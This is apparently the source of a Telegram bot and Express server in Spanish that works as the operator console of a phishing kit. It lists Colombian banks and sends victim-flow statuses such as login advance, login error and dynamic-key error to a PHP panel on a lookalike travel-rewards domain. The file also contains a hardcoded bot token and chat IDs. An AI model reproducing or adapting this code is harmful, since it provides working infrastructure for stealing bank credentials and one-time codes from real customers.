const express = require('express');
const bodyParser = require('body-parser');
const { Telegraf } = require('telegraf');
const app = express();

// Token del bot
const BOT_TOKEN = '7499168477:AAFS14MNklz1lERmgDufQkSXefOKyGgJh-E';  // Reemplaza con tu token
const bot = new Telegraf(BOT_TOKEN);

// Chat IDs de los usuarios a los que enviarás el mensaje
const chatIds = ['8481277251', '6183081769', '6951315808'];  // Reemplaza con los chat IDs de los usuarios

// Configuración del servidor Express
app.use(bodyParser.json());

// Función para enviar mensaje a varios usuarios
function sendMessageToUsers(message) {
    chatIds.forEach(chatId => {
        bot.telegram.sendMessage(chatId, message)
            .then(() => {
                console.log(`Mensaje enviado a ${chatId}`);
            })
            .catch(err => {
                console.error(`Error al enviar mensaje a ${chatId}:`, err);
            });
    });
}

const bancosDisponibles = [
    "bancolombia", "davivienda", "bbva", "bogota", "avvillas", "occidente",
    "colpatria", "falabella", "nequi", "social", "sudameris", "santander",
    "pichincha", "coopcentral", "agrario", "popular", "itau",
    "bancamia", "finandina", "daviplata", "nubank"
  ];

  
  bot.on('callback_query', (ctx) => {
    const data = ctx.callbackQuery.data;
    const userId = ctx.from.id;

    // Ejemplo de data: "accion_avanzar|1712912938"
    const [accion, id] = data.split('|');  // dividimos la acción del id

    let estatus = "";

    switch (accion) {

        
        case 'login_avanzar':
            estatus = 5;
            break;
        case 'accion_avanzar':
            estatus = 0;
            break;
            case 'login_error':
                estatus = 98;
                break;
        case 'volver_formulario':
            estatus = 99;
            break;
            case 'error_dinamica':
                estatus = 97;
                break;
        
            default:
            estatus = 'Acción desconocida';
            break;

          
           
    }

    // Hacer el fetch al servidor PHP con el id correcto


      fetch(`https://ofertasviajeros.avianlifemillas-reserva.shop/solicitudes/index.php?id=${id}&estatus=${encodeURIComponent(estatus)}`)
        .then(response => response.json())
        .then(data => {
            console.log('Respuesta del servidor PHP:', data);
            ctx.reply(`✅"${estatus}" registrada para ID: ${id}`);
        })
        .catch(error => {
            console.error('Error en la solicitud:', error);
            ctx.reply("⚠️ Hubo un problema al actualizar el estado.");
        });

    ctx.answerCbQuery();
});
// Función para obtener el dato del formulario
function getFormData(mensaje, label) {
    const regex = new RegExp(`.*${label}: ([^\n]+)`);
    const match = mensaje.match(regex);
    return match ? match[1] : 'No disponible';
}



 




// Comando /start para iniciar el bot
bot.start((ctx) => {
    const mensaje = "¡Hola! Este es un mensaje enviado a múltiples usuarios.";
    sendMessageToUsers(mensaje);  // Enviar el mensaje a todos los usuarios
    ctx.reply('¡Hola! Soy un bot, ¿en qué puedo ayudarte?');
});

// Iniciar el bot
bot.launch().then(() => {
    console.log('Bot iniciado...');
});

// Levanta el servidor Express en el puerto 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
app.get('/', (req, res) => {
  res.send('Servidor activo');
});
